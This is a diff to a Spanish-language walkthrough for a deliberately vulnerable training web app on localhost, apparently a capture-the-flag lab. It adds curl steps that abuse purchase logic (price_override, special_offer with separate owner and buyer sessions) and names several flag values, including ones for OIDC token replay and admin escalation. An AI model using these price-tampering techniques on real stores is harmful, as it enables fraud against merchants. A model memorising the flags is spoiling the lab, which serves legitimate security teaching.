@@ -25,6 +25,9 @@
 
 > **¿Prefieres Burp Suite?** Este lab mezcla **Repeater** (lógica de precios, transferencias, rate limit) con **Intercept** (flujo OAuth/OIDC en el navegador proxyado) e **Intruder** (concurrencia/rate). Config y límites de Community en el **Anexo 7** del `README.md`.
 
+> **¿Dónde está la flag?** Al completar un reto, la bandera ya viene **en la propia respuesta HTTP**: respuestas JSON con los campos `flag` (única) y `flags` (lista); respuestas no-JSON (HTML/SSE/archivos/redirects) con la cabecera `X-Flag`/`X-Flags`. Detalle en la sección 4 del `README.md`.
+> **Retos con estado**: R22 entregará su flag al obtener el **200 tras un 429** (ventana del rate limit); R25 entrega `FH{oidc-token-replay}` la **segunda vez** que reenvías el mismo `id_token`; R26 entrega `FH{full-chain-admin}` cuando usas un token de una cuenta **ya escalada a admin** (mass assignment/BFLA). El estado es compartido entre los 4 workers.
+
 ---
 
 ## R20 — Manipulación de precio en la compra
@@ -52,15 +55,21 @@
      -H 'Content-Type: application/json' -d '{"price_override":0.01}'
    ```
    → `actual_price: 120.0`, `paid_amount: 1.0`.
-4. **special_offer**: se activa si `special_offer=true` **y** el precio base supera $1000 (reduce a la mitad, app.py:3499). Crea un producto caro (con cualquier cuenta/sesión que dé owner) y cómpralo:
+4. **special_offer**: se activa si `special_offer=true` **y** el precio base supera $1000 (reduce a la mitad, app.py:3499). Crea un producto caro **con una sesión distinta de la que compra** (el endpoint de compra rechaza comprar tu propio producto, app.py:3459) y cómpralo con `jim`:
    ```bash
-   curl -s -b /tmp/jims.txt -X POST http://localhost:5000/api/secure/products \
+   # Crea la prenda cara ($2000) con la sesión de john (owner=john)...
+   curl -s -c /tmp/johns.txt -X POST http://localhost:5000/login \
+     -d 'username=john&password=password123' -o /dev/null
+   NID=$(curl -s -b /tmp/johns.txt -X POST http://localhost:5000/api/secure/products \
      -H 'Content-Type: application/json' \
-     -d '{"name":"Designer Coat","brand":"Lux","price":2000,"sku":"COAT-X"}'
-   # quedará con id alto (id de jim); usa ese id:
-   curl -s -b /tmp/jims.txt -X POST http://localhost:5000/api/products/<NUEVO_ID>/purchase \
+     -d '{"name":"Designer Coat","brand":"Lux","price":2000,"sku":"COAT-X"}' | jq -r '.id')
+   # ...y cómprala con la sesión de jim (dueño ≠ comprador):
+   curl -s -b /tmp/jims.txt -X POST http://localhost:5000/api/products/$NID/purchase \
      -H 'Content-Type: application/json' -d '{"special_offer":true}'
    ```
+   → `actual_price: 2000.0`, `paid_amount: 1000.0`, `success: true`.
+
+> ⚠️ **Ejemplo fallido (cómo NO se hace)**: si creas el producto con la **misma** sesión de `jim` que compra, el endpoint responde `{"error":"You cannot purchase your own product",...}` (app.py:3459) — el dueño y el comprador deben ser usuarios distintos.
 
 **Prueba de éxito**: `success: true` con `paid_amount` muy por debajo de `actual_price` (verificado: $25 → $0.25 con SAVE99; $120 → $1.00 con price_override).
 
